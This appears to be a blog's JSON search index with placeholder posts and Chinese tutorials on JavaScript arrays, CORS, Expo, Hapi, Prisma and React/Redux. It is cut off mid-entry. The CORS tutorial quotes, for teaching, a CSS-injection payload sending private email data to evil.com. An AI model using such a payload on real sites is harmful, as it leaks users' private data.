[{"content":"Markdown here\n","description":"test post","id":0,"section":"updates","tags":null,"title":"May 2019","uri":"https://danacoding.github.io/updates/2019_may/"},{"content":"Markdown here\n","description":"test post","id":1,"section":"docs","tags":null,"title":"Basic Usage","uri":"https://danacoding.github.io/docs/gettingstarted/basicusage/"},{"content":"Markdown here\n","description":"test post","id":2,"section":"updates","tags":null,"title":"April 2019","uri":"https://danacoding.github.io/updates/2019_april/"},{"content":"Markdown here\n","description":"test post","id":3,"section":"docs","tags":null,"title":"Configuration","uri":"https://danacoding.github.io/docs/gettingstarted/configuration/"},{"content":"Markdown here\n","description":"test post","id":4,"section":"updates","tags":null,"title":"March 2019","uri":"https://danacoding.github.io/updates/2019_march/"},{"content":"Markdown here\n","description":"test post","id":5,"section":"docs","tags":null,"title":"Installation","uri":"https://danacoding.github.io/docs/gettingstarted/installation/"},{"content":"Markdown here\n","description":"test post","id":6,"section":"updates","tags":null,"title":"February 2019","uri":"https://danacoding.github.io/updates/2019_february/"},{"content":"Markdown here\n","description":"test post","id":7,"section":"docs","tags":null,"title":"Quick Start","uri":"https://danacoding.github.io/docs/gettingstarted/quickstart/"},{"content":"Markdown here\n","description":"test post","id":8,"section":"updates","tags":null,"title":"January 2019","uri":"https://danacoding.github.io/updates/2019_january/"},{"content":"一、四个必备的js数组方法 1. Array.prototype.map() 数组元素更新  创建一个新数组。结果是一个与原数组长度相同的数组，并根据提供的函数转换元素。  1 2 3 4  const arr = [1, 2, 3]; const double = x =\u0026gt; x * 2; arr.map(double); // [2, 4, 6]   2. Array.prototype.filter() 数组元素过滤  创建一个新数组。根据提供的函数返回原数组的子集，结果是一个与原数组长度相同或小于的数组。  1 2 3 4  const arr = [1, 2, 3]; const isOdd = x =\u0026gt; x % 2 === 1; arr.filter(isOdd); // [1, 3]   3. Array.prototype.reduce() 数组转换  根据reducer函数和初始值创建任何类型的输出值。  1 2 3 4 5 6 7 8  const arr = [1, 2, 3]; const sum = (x, y) =\u0026gt; x + y; arr.reduce(sum, 0); // 6  const increment = (x, y) =\u0026gt; [...x, x[x.length - 1] + y]; arr.reduce(increment, [0]); // [0, 1, 3, 6]   4. Array.prototype.find() 匹配第一个元素 1 2 3 4  const arr = [1, 2, 3]; const isOdd = x =\u0026gt; x % 2 === 1; arr.find(isOdd); // 1   二、在数组开头添加新元素 1. Array.prototype.concat 1 2 3 4 5  const array = [1, 2, 3]; const newFirstElement = 4; const newArray = [newFirstElement].concat(array); console.log(newArray); // [4, 1, 2, 3]   2. Array.prototype.unshift 1 2 3 4  const array = [1, 2, 3]; array.unshift(4); console.log(array); // [4, 1, 2, 3]   3. Spread 展开运算符 1 2 3 4  const array = [1, 2, 3]; const newArray = [4, ...array]; console.log(newArray); // [4, 1, 2, 3]   4. Array.prototype.splice  splice(索引, 从第一个参数中指定的索引开始删除的元素数, 想要插入的元素)  1 2 3 4  const array = [1, 2, 3]; array.splice(0,0,4); console.log(array); // // [4, 1, 2, 3]   三、移除数组重复项 1. Set 1 2 3  const arr = [1, 1, 2, 3]; [...new Set(arr)]; // [1, 2, 3]   2. Array.prototype.filter 1 2 3  const arr = [1, 1, 2, 3]; arr.filter((item, index) =\u0026gt; arr.indexOf(item) === index); // [1,2,3]   3. Array.prototype.map 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const arr = [1, 1, 2, 3]; function toUniqueArray(array) { let newArr = [] array.map((x) =\u0026gt; { if(!newArr.includes(x)) { newArr.push(x) }; }); return newArr; }; toUniqueArray(arr); // [1, 2, 3]   4. Array.prototype.forEach 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const arr = [1, 1, 2, 3]; function toUniqueArray(array) { let newArr = {}; array.forEach(function(i) { if(!newArr[i]) { newArr[i] = true; } }); return Object.keys(newArr); } toUniqueArray(arr); // [\u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;]   5. for 1 2 3 4 5 6 7 8 9 10 11 12 13 14  const arr = [1, 1, 2, 3]; function toUniqueArray(array) { let newArr = []; for (let i = 0; i \u0026lt; array.length; i++) { if (newArr.indexOf(array[i]) === -1) { newArr.push(array[i]); } } return newArr; }; toUniqueArray(arr); // [1, 2, 3]   四、数组中最小值和最大值  Math.min() Math.max() (\u0026hellip;) Spread 展开运算符  1 2 3 4  const arr = [2, 4, 6, 8, 1, 3, 5, 7]; Math.min(...arr); // 1 Math.max(...arr); // 8   ","description":"有趣的数组方法实现","id":9,"section":"jsts","tags":null,"title":"Array","uri":"https://danacoding.github.io/jsts/array/array-bp/"},{"content":"collect.js \u0026amp; ramda（ 处理数组和对象的好帮手 ）\nStep1. 安装 yarn add collect.js\ryarn add ramda\rStep2. 导入 import collect from 'collect.js'\rimport * as R from 'ramda'\rStep3. （项目实例，用来渲染多屏，每屏里面有 8 张卡片） 使用 collect.js 示例 ，使用 chunk 方法\n//拆分数组\rconst collection = collect(scenesData.data);\rconst chunks = collection.chunk(8);//按8个为一组拆分\rconst newArr = chunks.all();\r//用于渲染的二维数组列表(每屏最多8个)\rconst renderItems = newArr.map((items, key) =\u0026gt; {\rreturn (\r\u0026lt;ImageBackground key={key} source={require('../../assets/images/bg.png')} style={styles.slide}\u0026gt;\r{\ritems.map((item) =\u0026gt; {\rreturn (\r\u0026lt;Card key={item.scenId} onPress={() =\u0026gt; navigate('Detail', { data: item })} style={styles.card}\u0026gt;\r\u0026lt;Image source={{ uri: item.imgUrl }} style={styles.img} /\u0026gt;\r\u0026lt;Text style={styles.title}\u0026gt;\r{item.name}\r\u0026lt;/Text\u0026gt;\r\u0026lt;/Card\u0026gt;\r)\r})\r}\r\u0026lt;/ImageBackground\u0026gt;\r)\r})\r使用ramda示例，使用splitEvery方法\n//拆分数组\rconst newArr = R.splitEvery(8,scenesData.data) //按8个为一组拆分\r//用于渲染的二维数组列表(每屏最多8个)\rconst renderItems = newArr.map((items, key) =\u0026gt; {\rreturn (\r\u0026lt;ImageBackground key={key} source={require('../../assets/images/bg.png')} style={styles.slide}\u0026gt;\r{\ritems.map((item) =\u0026gt; {\rreturn (\r\u0026lt;Card key={item.scenId} onPress={() =\u0026gt; navigate('Detail', { data: item })} style={styles.card}\u0026gt;\r\u0026lt;Image source={{ uri: item.imgUrl }} style={styles.img} /\u0026gt;\r\u0026lt;Text style={styles.title}\u0026gt;\r{item.name}\r\u0026lt;/Text\u0026gt;\r\u0026lt;/Card\u0026gt;\r)\r})\r}\r\u0026lt;/ImageBackground\u0026gt;\r)\r})\r图示 ","description":"数组和对象的好帮手","id":10,"section":"jsts","tags":null,"title":"Collect \u0026 Ramda","uri":"https://danacoding.github.io/jsts/cr/cr/"},{"content":"CORS (跨域资源共享)，它是浏览器获取内容的方式的一部分。\n一、没有 CORS 的跨域访问存在不安全问题 这不是我们的错，只能说这是WEB技术发展的历史问题\n\u0026lt;script src=\u0026quot;…\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;…\u0026quot; /\u0026gt;\r\u0026lt;iframe src=\u0026quot;…\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\r\u0026lt;video src=\u0026quot;…\u0026quot;\u0026gt;\u0026lt;/video\u0026gt;\r\u0026lt;audio src=\u0026quot;…\u0026quot;\u0026gt;\u0026lt;/audio\u0026gt;\r像这样的 API 运行时向另一个网站发出请求并以特定的方式处理响应，而无需其他站点的同意。\n当你使用上述方法之一请求其他站点的内容时，它会发送其他站点的凭据（包括 cookie、TLS、Authorization等）。\n多年来，这造成了大量的安全问题。\n\u0026lt;img src=\u0026quot;https://your-bank/your-profile/you.jpg\u0026quot; /\u0026gt;\r如果上面的图片加载，我可以读取图像的宽度和高度，甚至更多信息。\n2009 年，事实证明雅虎邮件容易受到一个相当简单的攻击。攻击者向用户发送一封电子邮件，主题包括');}，然后另一封电子邮件的主题包括{}html{background:url('//evil.com/?：\n…\r\u0026lt;li class=\u0026quot;email-subject\u0026quot;\u0026gt;Hey {}html{background:url('//evil.com/?\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026quot;email-subject\u0026quot;\u0026gt;…private data…\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026quot;email-subject\u0026quot;\u0026gt;…private data…\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026quot;email-subject\u0026quot;\u0026gt;…private data…\u0026lt;/li\u0026gt;\r\u0026lt;li class=\u0026quot;email-subject\u0026quot;\u0026gt;Yo ');}\u0026lt;/li\u0026gt;\r…\r这意味着用户的一些私人电子邮件数据被夹在一些将解析为有效 CSS 中。然后，攻击者说服用户访问包含以下内容的页面：\n\u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;https://m.yahoo.com/mail\u0026quot; /\u0026gt;\r\u0026hellip;使用yahoo.com的 cookie加载，CSS 解析并将私人信息发送到evil.com.\n这只是冰山一角，从浏览器错误到CPU 漏洞利用，这些泄漏的资源给我们带来了数十年的问题。\n二、如何解决这个问题（1） 很明显，上述内容是 Web 设计中的一个错误，因此我们不再创建可以处理此类请求的 API。以下是主要的策略（这里只列出主要的）：\n1. 同源策略 的由来 1995 年，Netscape 2 就带来了两个惊人的新功能：LiveScript 和 HTML 框架。框架让您可以将一个页面嵌入到另一个页面中，LiveScript 可以与两个页面进行交互。\nNetscape 意识到这会带来安全问题；你不希望一个邪恶的页面能够读取你的银行页面的 DOM，所以他们决定只有在两个页面具有相同的来源时才允许跨框架脚本。\n这就是同源策略的由来。\n#. 同源策略的缺陷 这个想法是同一来源的网站更有可能拥有相同的所有者。\n这并不完全正确，因为很多网站都按 URL 划分内容，例如http://example.com/~danacoding/，但必须在某处划清界线。\n2. 来源与站点 一些网络功能不处理来源，它们处理站点。\n例如，https://help.youtube.com和https://support.youtube.com有不同的来源，但它们是相同的网站。\nCookie 是在站点级别运行的最常见功能，因为你可以创建 Cookie 发送到 youtube.com.\n#. 站点的缺陷 但是！！！这是一个看起来一样的站点，也有可能是一个伪网站、子域或者受到不同前后缀的影响。\n三、如何解决这个问题（2） 1. 删除凭据？ 某些网站根据访问它们的 IP 地址提供不同的内容。\n因此，如果你在家中访问我的网站，我可以开始向常见主机名和 IP 地址发出请求，寻找不安全的物联网设备，寻找使用默认密码的路由器。\n#. 删除凭据的缺陷 删除凭据是解决方案的一部分，但仅靠它是不够的。没有办法知道资源是否包应该含私有数据。\n2. 给资源添加多个跨域来源？ // /crossdomain.xml\r\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE cross-domain-policy SYSTEM \u0026quot;https://www.adobe.com/xml/dtds/cross-domain-policy.dtd\u0026quot;\u0026gt;\r\u0026lt;cross-domain-policy\u0026gt;\r\u0026lt;site-control permitted-cross-domain-policies=\u0026quot;master-only\u0026quot; /\u0026gt;\r\u0026lt;allow-access-from domain=\u0026quot;*.example.com\u0026quot; /\u0026gt;\r\u0026lt;allow-access-from domain=\u0026quot;www.example.com\u0026quot; /\u0026gt;\r\u0026lt;allow-http-request-headers-from domain=\u0026quot;*.adobe.com\u0026quot; headers=\u0026quot;SOAPAction\u0026quot; /\u0026gt;\r\u0026lt;/cross-domain-policy\u0026gt;\r这是 Flash 所采用的安全模型，我很陌生，我对它不感兴趣，反正它存在很多问题，很明显\n#. 给资源添加多个跨域来源的缺陷 /crossdomain.xml 来源会开始变得非常多，请求也会非常多，越多问题就越大。\n3. 给不同类型的资源添加跨域来源？ 注意这里的资源和来源的区别。\n#. 给不同类型的资源添加跨域来源的缺陷 如果，资源不是xml，就必须选择不同的格式。\n4. HTTP 表头添加跨域请求 语音浏览器工作组的提议使用 HTTP 标头进行了概括，并成为跨域资源共享（CORS）。\nAccess-Control-Allow-Origin: *\r四、CORS 请求 默认情况下，大多数现代 Web 功能都需要 CORS，例如fetch().\n现代功能也有例外，这些功能旨在支持不使用 CORS 的旧功能，例如\u0026lt;link rel=\u0026quot;preload\u0026quot;\u0026gt;.\n不幸的是，对于哪些需要和不需要 CORS 没有简单的规则。例如：\n\u0026lt;!-- Not a CORS request --\u0026gt;\r\u0026lt;script src=\u0026quot;https://example.com/script.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;!-- CORS request --\u0026gt;\r\u0026lt;script type=\u0026quot;module\u0026quot; src=\u0026quot;https://example.com/script.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\r#. 检查是否是CORS请求 弄清楚它的最好方法是尝试并查看网络 DevTools。\n在 Chrome 和 Firefox 中，跨域请求与 Sec-Fetch-Mode标头一起发送，该标头会告诉你它是否是 CORS 请求。\n不幸的是，Safari 还没有实现这一点。\n#. HTML 元素设置 CORS 请求 \u0026lt;img crossorigin src=\u0026quot;…\u0026quot; /\u0026gt;\r\u0026lt;script crossorigin src=\u0026quot;…\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;link crossorigin rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;…\u0026quot; /\u0026gt;\r\u0026lt;link crossorigin rel=\u0026quot;preload\u0026quot; as=\u0026quot;font\u0026quot; href=\u0026quot;…\u0026quot; /\u0026gt;\r#. Origin 标头 默认情况下，跨源 CORS 请求是在没有凭据的情况下进行的。\n因此，没有 cookie、没有客户端证书、没有自动Authorization标头，并且Set-Cookie响应被忽略。\n但是，同源请求包括凭据。\nReferer标头经常被浏览器扩展和“互联网安全”软件欺骗或删除，因此创建了一个新标头Origin，它提供了发出请求的页面的来源。\n五、CORS 响应 要通过 CORS 检查并授予其他源访问响应的权限，响应必须包含以下标头：\nAccess-Control-Allow-Origin: *\r该*可与请求的值来代替Origin头，但*对于任何请求没有凭据发送。\n与所有标头一样，标头名称不区分大小写，但值区分大小写。\n#. CORS 缓存 CORS 请求不会绕过缓存。Firefox 会根据请求是否具有凭据对其 HTTP 缓存进行分区，\nChrome 也计划这样做，但仍然需要担心 CDN 缓存。\n#. 将 CORS 添加到长缓存资源 如果你的资产具有较长的缓存生命周期，你可能习惯于在内容更改时更改文件名，以便用户选择新内容。\n当涉及到标题更改时，同样也适用。\n如果你添加Access-Control-Allow-Origin: *到具有较长缓存生命周期的资源，请务必更改 URL，\n以便客户端返回您的服务器并获取新标头，而不是重用没有标头的缓存版本。\n#. 给 CORS 表头添加条件 你应该在对 URL 的所有响应中包含它，无论请求是否有Cookie标头。\n别问我为什么，这就是规范。\nVary: Origin, Cookie\r#. Access-Control-Allow-Origin: * 并不完全安全 如果资源不包含私有数据，那么Access-Control-Allow-Origin: * 是完全安全的。\n如果资源有时包含依赖于 cookie 的私有数据，那么添加Access-Control-Allow-Origin: *也是是安全的，只要你还包含一个Vary: Cookie标头。\n但是，如果你使用诸如发件人的 IP 地址之类的东西来“保护”数据，那么Access-Control-Allow-Origin: *就是不安全的。\n#. 添加凭据 默认情况下，跨源 CORS 请求是在没有凭据的情况下进行的。但是，各种 API 将允许你重新添加凭据。\n添加凭据更加安全，因为公开私人数据是有风险的。\n request  const response = await fetch(url, {\rcredentials: 'include',\r});\r//or\r\u0026lt;img crossorigin=\u0026quot;use-credentials\u0026quot; src=\u0026quot;…\u0026quot; /\u0026gt;\r response  Access-Control-Allow-Credentials: true\rAccess-Control-Allow-Origin: https://danacoding.com\rVary: Cookie, Origin\r六、不寻常的请求和预检 通常的请求是这样的\nfetch(url, { credentials: 'include' });\rfetch(url, {\rmethod: 'POST',\rbody: formData,\r});\r不寻常的请求是这样的\nfetch(url, {\rmethod: 'wibbley-wobbley',\rcredentials: 'include',\rheaders: {\rfancy: 'headers',\r'here-we': 'go',\r},\r});\r#. 预检请求 如果你尝试发出不寻常的请求，浏览器首先会询问其他源是否可以发送它。此过程称为预检。\n在发出请求之前，浏览器会使用OPTIONS方法向目标 URL 发出预检请求，并且标头如下：\nAccess-Control-Request-Method: wibbley-wobbley\rAccess-Control-Request-Headers: fancy, here-we\r预检请求从不包含凭据（主请求会包含）。\n#. 预检响应 Access-Control-Max-Age: 600\rAccess-Control-Allow-Methods: Wibbley-Wobbley, WIBBLEY-WOBBLEY //Chrome 区分大小写\rAccess-Control-Allow-Headers: fancy, here-we\r  Access-Control-Max-Age 缓存此预检响应的秒数，以避免需要对此 URL 进行进一步预检。默认值为 5 秒。\n  Access-Control-Allow-Methods 允许的不寻常方法。这可以是逗号分隔的列表，并且值区分大小写。\n如果要在没有凭据的情况下发送主请求，使用*。\n  Access-Control-Allow-Headers 允许的不寻常标题。这可以是逗号分隔的列表，不区分大小写。\n如果要在没有凭据的情况下发送主请求，使用*。\n  ","description":"","id":11,"section":"others","tags":null,"title":"CORS 跨域资源共享","uri":"https://danacoding.github.io/others/cors/cors/"},{"content":"一、运行设备  Expo客户端App 浏览器 模拟器(使用genymotion)   下载并安装 Android Studio 3.0+\n在Android Studio中，转到首选项\u0026gt;外观和行为\u0026gt;系统设置\u0026gt; Android SDK。单击 SDK工具选项卡，并确保已安装至少一个版本的Android SDK Build-Tools\n设定虚拟设备\n 二、安装 npm install --global expo-cli\r三、验证登录 expo whoami\r四、创建项目 expo init my-app\r有5种模板可以选择：\n--- Managed workflow 托管工作流 ---\r  blank 像空画布一样干净的最小应用程序。 blank (TypeScript) 与空画布相同，但具有TypeScript配置。 tabs (TypeScript) 使用react-navigation和TypeScript的几个示例屏幕和选项卡。\n\u0026mdash; Bare workflow 裸漏工作流 \u0026mdash; minimal 光秃秃的，最小的，只是使您入门的基本要素。 minimal (TypeScript) ：与最小相同，但具有TypeScript配置  五、启动开发服务器 expo start\r六、在手机/模拟器/浏览器上打开应用  Expo App：链接方式：隧道Tunnel 局域网LAN 本地Local.选择Tunnel二维码扫描 模拟器：Expo 命令行窗口键入 a 浏览器：Expo 命令行窗口键入 w  七、构建 //android\rexpo build:android\r//IOS\rexpo build:ios\r 使用Expo则是使用了托管工作流 （区别于裸漏工作流），所以构建后的apk保存在Expo账户中，30天后，将自动从Expo服务器中清除构建作业工件，例如二进制文件（.ipa，.aab，.apk等）和日志文件，下载并部署的应用程序二进制文件将始终可以正常运行！\n 八、升级Expo //升级SDK\rexpo upgrade\r//升级expo-cli\rnpm i -g expo-cli\r九、退出 Expo 服务 //键盘\rCtrl + C\r十、Expo 命令行 › 按？│ 显示所有命令\n› 按a│打开Android\n› shift + a│选择设备或仿真器\n› 按w│打开网页\n› 按o│在编辑器中打开项目代码\n› 按c│显示项目QR\n› 按p│切换构建模式（开发）\n› 按r│重新启动捆绑器\n› shift + r│重新启动并清除缓存\n› 按d│打开Expo DevTools\n› shift + d│在启动时切换自动打开DevTools（已启用）\n› 按e│通过电子邮件共享应用程序链接\n十一、每个应用程序都由 React Native，Expo SDK 和 第三方库 组合组成。 十二、开发/生产方式切换 十三、发布更新 优化代码（压缩图片等）：npx expo-optimize\n通过命令行发布：expo publish 执行此操作时，打包程序将压缩所有代码并生成两个版本的代码（一个版本用于iOS，一个版本用于Android），然后将其上传到CDN。您将获得一个链接，例如https://exp.host/@ccheever/an-example ，任何人都可以从中加载您的项。\n通过Expo Dev Tools发布：\n 选择开发方式\u0026amp;Tunnel则发布到ExpoApp中用于开发测试。 选择生产方式\u0026amp;Tunnel则发布到用户App的生产环境中。 对应用程序图标等在app.json配置的内容则需要重新打包才有效，通过发布更新无效。  ","description":"","id":14,"section":"react-native","tags":null,"title":"Expo 基础","uri":"https://danacoding.github.io/react-native/expo/expo-base/"},{"content":"Hapi起初是给沃尔玛的“黑色星期五”开发的，是企业级的开发框架。\nExpress等开发框架的大部分功能都严重依赖中间件，中间件只是不良设计的别称。\n中间件实质上是一系列使用回调执行下一个功能的函数。问题在于，随着应用程序规模和复杂性的增长，中间件的执行顺序变得越来越重要，也更加难以维护。 在依赖中间件之前执行中间件会导致应用程序失败。\n而hapi则更多地将功能内置于核心中。 正文解析 (Body Parsing)，cookie的处理，输入/输出验证以及HTTP友好错误处理对象已内置在hapi的框架中。\n为了获得更多功能，hapi在其核心生态系统中提供了丰富的插件选择。\nhapi也是唯一一个不依赖外部依赖项的框架。每个依赖项均由核心hapi团队进行管理，这使安全性和可靠性成为了hapi的最大优势。\nStep1. 安装 //1.创建项目文件夹\rmkdir myproject\r//2.跳到目录内\rcd myproject\r//3.生成配置文件 package.json\rnpm init\r//4.安装hapi\rnpm install --save @hapi/hapi\r//或者指定版本号\rnpm install --save @hapi/hapi@17.x.x\rStep2. 创建一个Web服务器(server.js文件) 'use strict'; //严格模式\r//1. 引入hapi\rconst Hapi = require('@hapi/hapi'); //2.创建服务器对象，配置主机host和需要监听的端口\rconst server = Hapi.server({ port: 3000,\rhost: 'localhost'\r});\r//3.启动服务器方法\rconst init = async () =\u0026gt; {\rawait server.start();\rconsole.log(`Server running at: ${server.info.uri}`);\r}\r//4.进程监听 Node.js\rprocess.on('unhandledRejection', (err) =\u0026gt; {\rconsole.log(err);\rprocess.exit(1); });\r//5.执行启动服务器方法\rinit();\rStep3. 添加路由 'use strict'; //严格模式\r//1. 引入hapi\rconst Hapi = require('@hapi/hapi'); //2.创建服务器对象，配置主机host和需要监听的端口\rconst server = Hapi.server({ port: 3000,\rhost: 'localhost'\r});\r//3.启动服务器方法\rconst init = async () =\u0026gt; {\r//add路由1\rserver.route({\rmethod: 'GET', //可选 ['PUT', 'POST'] 或者 '*'\rpath: '/',\rhandler: (request, h) =\u0026gt; {\rreturn 'Hello, world!';\r}\r});\r//add路由2 动态路由\rserver.route({\rmethod: 'GET', //可选 ['PUT', 'POST'] 或者 '*'\rpath: '/{name}',\rhandler: (request, h) =\u0026gt; {\rreturn 'Hello, ' + encodeURIComponent(request.params.name) + '!';\r//请注意这里使用了 URI 编码, 这可以有效地防止内容注入攻击。\r//因此，尽量使用内容编码去处理用户输入的信息。\r}\r});\rawait server.start();\rconsole.log(`Server running at: ${server.info.uri}`);\r}\r//4.进程监听 Node.js\rprocess.on('unhandledRejection', (err) =\u0026gt; {\rconsole.log(err);\rprocess.exit(1); });\r//5.执行启动服务器方法\rinit();\r参数说明：\n method 可以使用任何有效的 HTTP 方法或者 HTTP 方法数组，又或者使用*去通配所有方法。 path 定义了该路径下所包含的参数，可以为可选参数，数字以及通配符。\n更多细节内容请参考 路由教程.  Step4. 启动服务器 node server.js\r在浏览器中访问 http://localhost:3000, 可以看到 Hello, world!, 之后再访问 http://localhost:3000/feng 将会看到 Hello, feng!。\nStep5. 输出静态文件内容 1.安装inert\nnpm install --save @hapi/inert\r2.新建public文件夹存放静态文件hello.html\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Hapi.js is awesome!\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;h1\u0026gt;Hello World.\u0026lt;/h1\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r3.注册inert到应用中\n'use strict'; //严格模式\r//1. 引入hapi\rconst Hapi = require('@hapi/hapi');\r//2.创建服务器对象，配置主机host和需要监听的端口\rconst server = Hapi.server({\rport: 3000,\rhost: 'localhost'\r});\r//3.启动服务器方法\rconst init = async () =\u0026gt; {\r//注册单个插件inert\rawait server.register({ plugin: require('@hapi/inert') });\r// add路由1\rserver.route({\rmethod: 'GET', //可选 ['PUT', 'POST'] 或者 '*'\rpath: '/',\rhandler: (request, h) =\u0026gt; {\rreturn 'hello world'\r}\r});\r//add路由2 动态路由\rserver.route({\rmethod: 'GET', //可选 ['PUT', 'POST'] 或者 '*'\rpath: '/{name}',\rhandler: (request, h) =\u0026gt; {\rreturn 'Hello, ' + encodeURIComponent(request.params.name) + '!';\r//请注意这里使用了 URI 编码, 这可以有效地防止内容注入攻击。\r//因此，尽量使用内容编码去处理用户输入的信息。\r}\r});\r//add路由3 读取静态文件\rserver.route({\rmethod: 'GET', //可选 ['PUT', 'POST'] 或者 '*'\rpath: '/file',\rhandler: (request, h) =\u0026gt; {\rreturn h.file('./public/hello.html');\r}\r})\rawait server.start();\rconsole.log(`Server running at: ${ server.info.uri }`);\r}\r//4.进程监听 Node.js\rprocess.on('unhandledRejection', (err) =\u0026gt; {\rconsole.log(err);\rprocess.exit(1);\r});\r//5.执行启动服务器方法\rinit();\r4.重启服务器并在浏览器中打开localhost:3000/任何字符，即可看到hello.html的内容\nnode server.js\rStep6. 使用插件 1.安装所需要的插件（这里安装hapi-pino日志插件）:\nnpm install hapi-pino\r2.注册插件\n'use strict'; //严格模式\r//1. 引入hapi\rconst Hapi = require('@hapi/hapi');\r//2.创建服务器对象，配置主机host和需要监听的端口\rconst server = Hapi.server({\rport: 3000,\rhost: 'localhost'\r});\r//3.启动服务器方法\rconst init = async () =\u0026gt; {\r//注册多个插件inert\u0026amp;pino\rawait server.register([\r{\rplugin: require('@hapi/inert')\r},\r{\rplugin: require('hapi-pino'),\roptions: { prettyPrint: false, logEvents: ['response', 'onPostStart'] }\r}\r]);\r// add路由1\rserver.route({\rmethod: 'GET', //可选 ['PUT', 'POST'] 或者 '*'\rpath: '/',\rhandler: (request, h) =\u0026gt; {\rreturn 'hello world'\r}\r});\r//add路由2 动态路由\rserver.route({\rmethod: 'GET', //可选 ['PUT', 'POST'] 或者 '*'\rpath: '/{name}',\rhandler: (request, h) =\u0026gt; {\r// request.log(['a','name'],\u0026quot;Request name\u0026quot;);\r//或者\rrequest.logger.info('In handler %s', request.path);\rreturn 'Hello, ' + encodeURIComponent(request.params.name) + '!';\r//请注意这里使用了 URI 编码, 这可以有效地防止内容注入攻击。\r//因此，尽量使用内容编码去处理用户输入的信息。\r}\r});\r//add路由3 读取静态文件\rserver.route({\rmethod: 'GET', //可选 ['PUT', 'POST'] 或者 '*'\rpath: '/file',\rhandler: (request, h) =\u0026gt; {\rreturn h.file('./public/hello.html');\r}\r})\rawait server.start();\rconsole.log(`Server running at: ${ server.info.uri }`);\r}\r//4.进程监听 Node.js\rprocess.on('unhandledRejection', (err) =\u0026gt; {\rconsole.log(err);\rprocess.exit(1);\r});\r//5.执行启动服务器方法\rinit();\r3.启动服务查看终端\nnode server.js\r","description":"","id":16,"section":"nodejs","tags":null,"title":"Hapi","uri":"https://danacoding.github.io/nodejs/hapi/hapi-base/"},{"content":"Prisma Prisma 是一个开源的下一代 ORM。它由以下部分组成：\n Prisma 客户端：用于 Node.js 和 TypeScript 的自动生成和类型安全的查询构建器 Prisma Migrate : 迁移系统 Prisma Studio：用于查看和编辑数据库中数据的 GUI (可视化图形工具)  下面是一个 Prisma 模式文件的例子，它指定：\n 数据源（PostgreSQL 或 MongoDB） 生成器（Prisma 客户端） 具有两个模型（具有一个关系）和一个模型的数据模型定义 enum 几个本机数据类型属性( @db.VarChar(255), @db.ObjectId)  SQL 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  datasource db { url = env(\u0026#34;DATABASE_URL\u0026#34;) provider = \u0026#34;postgresql\u0026#34; } generator client { provider = \u0026#34;prisma-client-js\u0026#34; } model User { id Int @id @default(autoincrement()) createdAt DateTime @default(now()) email String @unique name String? role Role @default(USER) posts Post[] } model Post { id Int @id @default(autoincrement()) createdAt DateTime @default(now()) updatedAt DateTime @updatedAt published Boolean @default(false) title String @db.VarChar(255) author User? @relation(fields: [authorId], references: [id]) authorId Int? } enum Role { USER ADMIN }   NoSQL (MongoDB) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  generator client { provider = \u0026#34;prisma-client-js\u0026#34; previewFeatures = [\u0026#34;mongoDb\u0026#34;] } datasource db { provider = \u0026#34;mongodb\u0026#34; url = env(\u0026#34;DATABASE_URL\u0026#34;) } model User { id String @id @default(dbgenerated()) @map(\u0026#34;_id\u0026#34;) @db.ObjectId createdAt DateTime @default(now()) email String @unique name String? role Role @default(USER) posts Post[] } model Post { id String @id @default(dbgenerated()) @map(\u0026#34;_id\u0026#34;) @db.ObjectId createdAt DateTime @default(now()) updatedAt DateTime @updatedAt published Boolean @default(false) title String author User? @relation(fields: [authorId], references: [id]) authorId String @db.ObjectId } enum Role { USER ADMIN }   ","description":"开源的下一代 ORM，基于 Node.js 和 TypeScript","id":19,"section":"nodejs","tags":null,"title":"Prisma ORM","uri":"https://danacoding.github.io/nodejs/orm/prisma/"},{"content":"这两种技术的关键原则是什么?\nReact 是提供数据的视图库，能以高效、可预测的方式渲染视图。\nRedux 是状态管理框架，可用于简化 APP 应用状态的管理。\n在 React Redux app 应用中，通常可创建单一的 Redux store 来管理整个应用的状态。\nReact 组件仅订阅 store 中与其角色相关的数据， 可直接从 React 组件中分发 actions 以触发 store 对象的更新。\nReact 组件可以在本地管理自己的状态，但是对于复杂的应用来说，它的状态最好是用 Redux 保存在单一位置，有特定本地状态的独立组件例外。\n当单个组件可能仅具有特定于其的本地状态时，算是例外。\n最后一点是，Redux 没有内置的 React 支持，需要安装 react-redux包， 通过这个方式把 Redux 的 state 和 dispatch 作为 props 传给组件。\n一、React 和 Redux class DisplayMessages extends React.Component {\r// 添加下面这行代码\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: '',\rmessages: []\r}\r}\r// 添加上面这行代码\rrender() {\rreturn \u0026lt;div /\u0026gt;\r}\r};\r二、首先在本地管理状态 class DisplayMessages extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: '',\rmessages: []\r}\r}\r// 在这里添加 handleChange() 和 submitMessage() 方法\rhandleChange(event) {\rthis.setState({\rinput: event.target.value,\rmessages: this.state.messages\r})\r}\rsubmitMessage() {\rthis.setState({\rinput: 